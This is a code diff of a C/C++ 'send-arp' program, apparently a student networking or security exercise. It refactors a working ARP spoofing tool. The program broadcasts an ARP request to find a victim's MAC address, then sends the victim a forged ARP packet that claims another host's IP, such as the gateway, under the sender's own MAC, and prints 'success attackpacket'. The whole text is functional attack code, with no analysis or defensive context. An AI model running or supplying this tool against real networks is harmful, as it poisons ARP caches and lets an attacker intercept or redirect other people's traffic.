@@ -14,6 +14,7 @@
 #define IPv4 0X0800
 #define Request 0X0001
 #define SIZE_IPADD 0x04
+#define MAC_LEN 6
 
 void usage() {
     printf("syntax: send-arp <interface> <sender ip> <target ip> \n");
@@ -25,42 +26,42 @@ struct EtherArpPacket {
     ARPheader arp;
 };
 
-void get_mac(uint8_t smac[])
+void get_mac(uint8_t smac[], char* dev)
 {
     struct ifreq s;
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
 
-    strcpy(s.ifr_name, "eth0");
-    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
-        int i;
-        for (i=0;i<6;++i) {
-            smac[i] = (unsigned char) s.ifr_addr.sa_data[i];
-        }
+    strcpy(s.ifr_name, dev);
+    if (0 != ioctl(fd, SIOCGIFHWADDR, &s)) {
+        printf("Can't get mac address");
+    }
+    int i;
+    for (i=0;i<6;++i) {
+        smac[i] = (unsigned char) s.ifr_addr.sa_data[i];
     }
 }
 
-char* get_ip()
+char* get_ip(char* dev)
 {
     int fd;
     struct ifreq ifr;
 
     fd = socket(AF_INET, SOCK_DGRAM, 0);
 
-    /* I want to get an IPv4 IP address */
     ifr.ifr_addr.sa_family = AF_INET;
 
-    /* I want IP address attached to "eth0" */
-    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);
+    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
 
-    ioctl(fd, SIOCGIFADDR, &ifr);
+    if ( 0 != ioctl(fd, SIOCGIFADDR, &ifr)){
+        printf("Can't get ip address");
+    }
 
     close(fd);
-
     return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
 }
 
-void sendpacket(pcap_t* handle, EtherArpPacket rqpacket) {
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&rqpacket), sizeof(EtherArpPacket));
+void sendpacket(pcap_t* handle, EtherArpPacket* rqpacket) {
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(rqpacket), sizeof(EtherArpPacket));
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         }
@@ -81,11 +82,13 @@ int main(int argc, char* argv[]) {
     }
 
     EtherArpPacket rqpacket;
+    char* sender_ip = argv[2];
+    char* target_ip = argv[3];
+    uint8_t broadmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    uint8_t unknownmac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 
-    for (int i=0; i<6; i++) {
-        rqpacket.ether.dmac[i] = 0xff;
-    }
-    get_mac(rqpacket.ether.smac);
+    memcpy(rqpacket.ether.dmac, broadmac, MAC_LEN);
+    get_mac(rqpacket.ether.smac, dev);
     rqpacket.ether.etype = htons(ARP);
 
     rqpacket.arp.htype = htons(Ethernet);
@@ -93,14 +96,13 @@ int main(int argc, char* argv[]) {
     rqpacket.arp.hal = sizeof(rqpacket.ether.dmac);
     rqpacket.arp.pal = SIZE_IPADD;
     rqpacket.arp.opcode = htons(Request);
-    get_mac(rqpacket.arp.smac);
-    inet_pton(AF_INET, get_ip(), &rqpacket.arp.sip);
-    for (int i=0; i<6; i++) {
-        rqpacket.arp.tmac[i] = 0x00;
-    }
-    inet_pton(AF_INET, argv[2], &rqpacket.arp.tip);
+    get_mac(rqpacket.arp.smac, dev);
+    inet_pton(AF_INET, get_ip(dev), &rqpacket.arp.sip);
+    memcpy(rqpacket.arp.tmac, unknownmac, MAC_LEN);
+    inet_pton(AF_INET, sender_ip, &rqpacket.arp.tip);
 
-    sendpacket(handle, rqpacket);
+    sendpacket(handle, &rqpacket);
+    printf("success broadpacket\n\n");
 
     while (true) {
         struct pcap_pkthdr* header;
@@ -117,14 +119,15 @@ int main(int argc, char* argv[]) {
 
             const struct ARPheader* arp = (struct ARPheader*)(rppacket + sizeof(Etherheader));
             if (ntohs(arp->opcode) ==0x0002 && arp->sip == rqpacket.arp.tip && arp->tip == rqpacket.arp.sip) {
-                for (int i=0; i<6; i++) {
-                    rqpacket.ether.dmac[i] = arp->smac[i];
-                    rqpacket.arp.tmac[i] = arp->smac[i];
-                }
-                inet_pton(AF_INET, argv[3], &rqpacket.arp.sip);
+                memcpy(rqpacket.ether.dmac, arp->smac, MAC_LEN);
+                memcpy(rqpacket.arp.tmac, arp->smac, MAC_LEN);
+
+                inet_pton(AF_INET, target_ip, &rqpacket.arp.sip);
             }
 
-            sendpacket(handle, rqpacket);
+            sendpacket(handle, &rqpacket);
+            printf("success attackpacket\n\n");
+
             break;
     }
 
